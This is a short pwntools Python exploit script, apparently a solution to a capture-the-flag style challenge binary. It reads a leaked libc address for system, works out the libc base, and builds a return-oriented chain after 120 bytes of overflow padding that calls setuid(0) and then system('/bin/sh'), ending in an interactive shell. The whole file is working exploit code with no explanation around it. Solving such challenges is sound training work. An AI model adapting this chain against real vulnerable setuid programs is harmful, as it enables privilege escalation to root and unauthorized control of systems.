from pwn import *

context.arch='amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']
file = '/home/darkstar/Downloads/temp'
elf = ELF(file)
libc = ELF('/usr/lib64/libc.so.6')

p = process(file)
gdb.attach(p, '''
    b *challenge+384
    continue
''')
p.recvuntil(b'[LEAK] The address of "system" in libc is: ')

system_libc_leak = int(p.recvline().strip()[:-1], 16)

system = libc.symbols['system']

libc_base_addr = system_libc_leak - system
libc.address = libc_base_addr
rop = ROP(elf)
rop_libc = ROP(libc)

pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])
syscall = libc.symbols['syscall']
setuid = libc.symbols['setuid']


print(hex(libc_base_addr))


Leaving = next(elf.search(b'Leaving!'))
binsh_addr = next(libc.search(b'/bin/sh'))

rop.raw(pop_rdi)
rop.raw(0)
rop.raw(setuid)
rop.raw(pop_rdi)
rop.raw(binsh_addr)
rop.raw(system_libc_leak)

rop.raw(elf.symbols['challenge'])
print(rop.dump())

payload = b'A'*120
payload += rop.chain()

p.recvuntil('\n')

p.sendline(payload)

p.interactive()

